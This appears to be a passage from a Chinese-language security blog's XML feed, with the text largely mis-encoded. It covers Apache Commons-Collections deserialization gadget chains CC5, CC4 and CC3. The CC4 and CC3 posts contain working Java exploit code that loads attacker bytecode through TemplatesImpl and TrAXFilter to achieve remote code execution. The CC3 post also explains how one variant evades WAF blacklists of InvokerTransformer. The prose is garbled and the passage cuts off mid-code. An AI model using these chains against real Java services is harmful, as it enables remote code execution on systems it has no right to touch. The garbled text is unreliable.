unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>é€šè¿‡pocæˆ‘ä»¬å‘ç°ç›´åˆ°lazyMapéƒ½æ˜¯å’Œcc1ä¸€æ ·çš„è°ƒç”¨ï¼Œåé¢ä»Proxyæ”¹æˆäº†TiedMapEntryç±»</p><p>æˆ‘ä»¬çŸ¥é“è§¦å‘è¯¥æ¡é“¾æ˜¯éœ€è¦è§¦å‘åˆ°LazyMapçš„getæ–¹æ³•æˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743599823-bddea8e9-0437-4c54-af01-80ba9066a9eb.png"></p><p>æˆ‘ä»¬æ‰¾åˆ°äº†TiedMapEntryç±»é‡Œé¢çš„toStringæ–¹æ³•ä¸­è°ƒç”¨äº† getValueæ–¹æ³•ã€‚è¿™ä¸ªæœ‰ç‚¹ç†Ÿæ‚‰åœ¨cc6ä¸­å‡ºç°è¿‡è·Ÿåˆ°getValueä¸­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743660503-cd5c9bc1-8c39-46cf-b740-28dbd39bbed1.png"></p><p>å‘ç°è°ƒç”¨äº† getæ–¹æ³•è€Œæˆ‘ä»¬åœ¨cc6ä¸­å·²å°†çŸ¥é“TiedMapEntryç±»çš„æ„é€ æ–¹æ³•æ˜¯å¯ä»¥ç›´æ¥å¯¹mapè¿™ä¸ªå±æ€§è¿›è¡Œèµ‹å€¼çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743712373-34322b83-7a98-4342-b42d-288737acc8f4.png"></p><p>æ‰€ä»¥è¿™é‡Œåªéœ€è¦æ‰¾åˆ°å¯ä»¥è§¦å‘è¯¥ç±»toStringçš„æ–¹æ³•å°±å¯ä»¥</p><p>ç»§ç»­è°ƒè¯•æˆ‘ä»¬å‘ç°äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743765500-03b8b2ed-d1f5-4333-a121-ea4abb10fa02.png">åœ¨BadAttributeValueExpExceptionè¿™ä¸ªç±»çš„readObjectä¸­å‘ç°äº†è°ƒç”¨äº†toStringæ–¹æ³•æ˜¯ç”±valObjè§¦å‘çš„è€ŒvalObjåˆ™æ˜¯è·å¾—valå±æ€§çš„å€¼ï¼Œç„¶åçœ‹çœ‹å…¶æ„é€ æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743831365-8c298754-31a8-4aa8-8fa4-cb28ef460830.png"></p><p>å‘ç°valæ˜¯å¯æ§çš„ï¼Œä½†æ˜¯å‘ç°åœ¨æ„é€ æ–¹æ³•é‡Œä¹Ÿè°ƒç”¨äº†toStringæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨æ„é€ çš„æ—¶å€™ä¸èƒ½ä¼ å…¥TiedMapEntryå¯¹è±¡ï¼Œå› ä¸ºè¿™å›å¯¼è‡´åœ¨åºåˆ—åŒ–å‰å°±ä¼šrceæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨å®ä¾‹åŒ–å®Œä¹‹ååå°„ä¿®æ”¹å…¶å±æ€§å€¼å°±å¯ä»¥äº†ã€‚</p><h3 id="cc5è°ƒç”¨é“¾"><a href="#cc5è°ƒç”¨é“¾" class="headerlink" title="cc5è°ƒç”¨é“¾"></a>cc5è°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714744407880-2899e688-e3e0-4ee2-bf22-275798698aa0.png"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collections4ååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>å…¶å®å¦‚æœææ‡‚äº†cc2 å’Œ cc3 ä¸¤æ¡é“¾ï¼Œcc4é“¾å°±æ²¡å•¥éš¾åº¦äº†ï¼Œå®ƒå°±æ˜¯è¿™ä¿©çš„ç»“åˆå…·ä½“åˆ†æçœ‹cc2 ä¸cc3</p><h3 id="cc4è°ƒç”¨é“¾"><a href="#cc4è°ƒç”¨é“¾" class="headerlink" title="cc4è°ƒç”¨é“¾"></a>cc4è°ƒç”¨é“¾</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">PriorityQueue.heapify()</span><br><span class="line">PriorityQueue.siftDown()</span><br><span class="line">PriorityQueue.siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TrAXFilter.TrAXFilter()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br></pre></td></tr></table></figure><p>è´´å‡ºpoc</p><pre><code class="java">//ååŠæ®µç”¨çš„æ˜¯cc3        byte[] shellcode = Files.readAllBytes(Paths.get(&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;));        TemplatesImpl templates = new TemplatesImpl();        // è·å– class å¯¹è±¡        Class clazz = templates.getClass();        // ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡        Field nameField = clazz.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;_name&quot;);        Field classField = clazz.getDeclaredField(&quot;_tfactory&quot;);        classField.setAccessible(true);        classField.set(templates, new TransformerFactoryImpl());        Field bytecodesField = clazz.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        bytecodesField.set(templates, new byte[][]&#123;shellcode&#125;);        // è§¦å‘æ–¹æ³•        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class [] &#123;Templates.class&#125;,new Object [] &#123;templates&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        //å‰åŠæ®µæ˜¯cc2        TransformingComparator comparator = new TransformingComparator(new ConstantTransformer(1));        PriorityQueue queue = new PriorityQueue(comparator);//åˆ›å»ºå®ä¾‹ã€‚æ³¨æ„ä¸‹é¢çš„é¡ºåºæ”¹å˜äº†ã€‚        queue.add(templates);        queue.add(2);//ä¼ å…¥ä¸¤ä¸ªå‚æ•°        Field field = Class.forName(&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;).getDeclaredField(&quot;transformer&quot;);//åå°„è·å–æˆå‘˜å˜é‡çš„field        field.setAccessible(true);//è·å–è®¿é—®æƒé™        field.set(comparator,chainedTransformer);//è®¾ç½®å‚æ•°        //serialize(queue);        unserialize(&quot;ser.bin&quot;);</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collections3ååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>java cc3é“¾<br>cc3ç”¨çš„æ˜¯åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„å½¢å¼è¿›è¡Œçš„rceå¯ä»¥å‚è€ƒè‡ªå·±è®°å¾—<a href="">åŠ¨æ€åŠ è½½å­—èŠ‚ç </a>çš„ç¬”è®°æ¥äº†è§£ã€‚</p><p>è¯¥é“¾ä¸»è¦æ˜¯åˆ©ç”¨äº†TemplatesImplè¿™ä¸ªç±»è¿›è¡Œå­—èŠ‚ç åŠ è½½ã€‚é€šè¿‡ç¬”è®°æˆ‘ä»¬äº†è§£åˆ°javaåŠ è½½.classçš„æ ¸å¿ƒä»£ç å°±æ˜¯defineclassæ–¹æ³•ï¼Œè€Œé€šè¿‡è°ƒè¯•å‘ç°TemplatesImplè¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»é‡å†™äº†defineclassæ–¹æ³•å¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸã€‚Javaä¸­é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ª æ–¹æ³•æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œå…¶ä½œç”¨åŸŸä¸ºdefaultã€‚æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„ defineClass ç”±å…¶çˆ¶ç±»çš„ protectedç±»å‹å˜æˆäº†ä¸€ä¸ªdefaultç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663398722-55450f8c-336f-4160-9cb6-fb68b2367e15.png"></p><p>ä½†æ˜¯æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªè¯¥ç±»ä¸€ä¸ªpublicç±»å‹æ¥è¿›è¡Œè°ƒç”¨è¯¥æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663560670-d044b685-2961-437d-9c2a-a31d628255f9.png">æˆ‘ä»¬åå‘è·Ÿè¸ªåœ¨defineTransletClassesä¸­è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œéœ€è¦_bytecodesä¸ä¸ºç©ºï¼Œå…¶å®è¿™ä¸ªå±æ€§å°±æ˜¯æˆ‘ä»¬è¦ä¼ å…¥çš„å­—èŠ‚ç ä½†æ˜¯è¿˜ä¸èƒ½è°ƒç”¨éœ€è¦ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663667380-3fba4569-64f0-44c6-8109-40b9ad24962d.png"></p><p>æ‰¾åˆ°äº†getTransletInstanceæ–¹æ³•å¹¶ä¸”å…¶å±æ€§_nameä¸èƒ½ä¸ºç©º _classéœ€è¦ä¸ºç©ºæ‰å¯ä»¥è°ƒç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸èƒ½åœ¨å¤–éƒ¨è°ƒç”¨éœ€è¦ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663736056-8819d01c-e84c-4813-b5a3-4f98c449fd25.png"></p><p>æœ€ç»ˆæ‰¾åˆ°äº†newTransformeræ–¹æ³•æ˜¯publicç±»å‹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹åŒ–TemplatesImplå¯¹è±¡è°ƒç”¨newTransformeræ–¹æ³•æ¥è§¦å‘defineclassåŠ è½½å­—èŠ‚ç ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹TemplatesImplæ„é€ æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663912873-86f895fb-445f-4457-b20d-6b315e042693.png"></p><p>å‘ç°å¹¶æ²¡ç”¨è¿›è¡Œä»»ä½•èµ‹å€¼æ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±æ‰‹åŠ¨è¿›è¡Œåå°„èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§¦å‘æ–¹æ³•</span></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘ç°ç©ºæŒ‡é’ˆé”™è¯¯ï¼Œé€šè¿‡è°ƒè¯•å‘ç°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664277730-268e14ac-7775-4c4f-b300-2ac2366302ae.png"></p><p>_tfactoryä¸ºç©ºæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»™å…¶ä¼ å…¥å€¼ï¼Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664331886-af671cab-f9c8-446d-a443-5829c7d7f385.png"></p><p>é€šè¿‡æŸ¥çœ‹å‘ç°å…¶æ˜¯transientç±»å‹æ˜¯ä¸å¯åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡äº§çœ‹readObjectä¸­çœ‹çœ‹æ˜¯ç»™å…¶èµ‹å€¼çš„ä»€ä¹ˆå°±ç»™ä»–èµ‹å€¼ä»€ä¹ˆå°±å¯ä»¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664419837-1a271fc1-9a92-4754-a71d-4bea2f9f6eee.png"></p><p>æ‰€ä»¥é‡æ–°æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bbyte[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§¦å‘æ–¹æ³•</span></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿è¡Œä¹‹åå‘ç°è¿˜æ˜¯æŠ¥é”™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664557971-bc6614a1-c6ac-46ba-93da-c9270ba0cc09.png"></p><p>åŸå› æ˜¯åœ¨åŠ è½½å­—èŠ‚ç ä¹‹åæœ‰ä¸€ä¸ªæ–¹æ³•æŸ¥çœ‹å­—èŠ‚ç çš„çˆ¶ç±»æ˜¯å¦æ˜¯<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664601418-b93e8e9d-23be-46c0-9744-cc79bf454422.png"></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©æˆ‘ä»¬çš„æ¶æ„ç±»ç»§æ‰¿è¯¥ç±»ä¹‹åå°±å¯ä»¥è¿è¡Œäº†ã€‚</p><p>ç„¶åæˆ‘ä»¬å’Œä¹‹å‰çš„cc1é“¾å‰é¢ç»“åˆä¸€ä¸‹å°±å¯ä»¥æˆä¸ºä¸€ä¸ªé“¾äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§¦å‘æ–¹æ³•</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;className&quot;</span>,<span class="string">&quot;aass&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(FaultAction.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ysoserialä½œè€…å‘ç°å…¶æ„é€ çš„é“¾è·Ÿæˆ‘ä»¬ä¸ä¸€æ ·ï¼Œä»–æ²¡æœ‰ç”¨è¿™ä¸ªInvokerTransformerå»è§¦å‘ï¼ŒåŸå› å°±æ˜¯å› ä¸ºå¯èƒ½æœ‰äº›wafä¼šå¯¹InvokerTransformeråšäº†é»‘åå•é™åˆ¶å¯¼è‡´ä¸èƒ½å¤Ÿä½¿ç”¨äº†ã€‚</p><p>æ‰€ä»¥ysoserialä½œè€…å‘ç°äº†com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter ã€‚ è¿™ä¸ªç±»çš„æ„é€ â½…æ³•ä¸­è°ƒâ½¤äº† (TransformerImpl) templates.newTransformer() ï¼Œå…å»äº†æˆ‘ä»¬ä½¿â½¤ InvokerTransformerâ¼¿â¼¯è°ƒâ½¤ newTransformer() â½…æ³•è¿™â¼€æ­¥ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714666476954-c09853ee-7994-4d00-978e-9e7cc10e2c93.png"></p><p>ä½†æ˜¯å‘¢ç”±äºè¯¥ç±»æ˜¯ä¸å¯ä»¥è¢«åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€šè¿‡å¯¹å…¶åå°„è·å–classå¯¹è±¡å¯¹å…¶è¿›è¡Œèµ‹å€¼ï¼Œè¿™é‡Œä½œè€…ysoserialæ‰¾åˆ°ä¸€ä¸ªInstantiateTransformerç±»ä»–å®ç°äº†transformer Serializableæ¥å£ï¼Œåœ¨å®ƒçš„transform()æ–¹æ³•ä¸­ï¼Œåˆ¤æ–­äº†inputå‚æ•°æ˜¯å¦ä¸ºClassï¼Œè‹¥æ˜¯Classï¼Œåˆ™é€šè¿‡åå°„å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡å¹¶è¿”å›ï¼›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714667122114-6b707d16-67b2-4975-b70f-a170a58e559d.png"></p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨InstantiateTransformerçš„transformæ–¹æ³•æ¥è§¦å‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>å®Œæ•´poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 